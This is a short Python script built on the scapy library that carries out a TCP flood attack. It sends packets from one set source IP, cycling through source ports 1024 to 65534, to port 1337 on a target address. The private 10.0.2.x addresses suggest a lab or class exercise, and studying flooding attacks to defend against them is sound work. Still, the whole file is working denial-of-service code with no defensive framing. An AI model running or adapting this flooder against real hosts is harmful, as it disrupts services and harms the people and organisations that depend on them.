#!/usr/bin/python3

# Below code is used to perform TCP flood attack 
# using Single IP and Multiple Ports

# from is used to import python libraries 

from scapy.all import *

# Below block of code is the definition of tcpfloodattack function 

def tcpfloodattack(source,target):
	for  sport in range(1024,65535):
		L3 = IP(src=source, dst=target)
		L4 = TCP(sport=sport, dport=1337)
		pkt = L3/L4
		send(pkt)

# Source variable indicating Source Machine IP Address
source = "10.0.2.5"
# Target variable indicating Target Machine IP Address
target = "10.0.2.15"

# Below line is calling tcpfloodattack function 

tcpfloodattack(source,target)
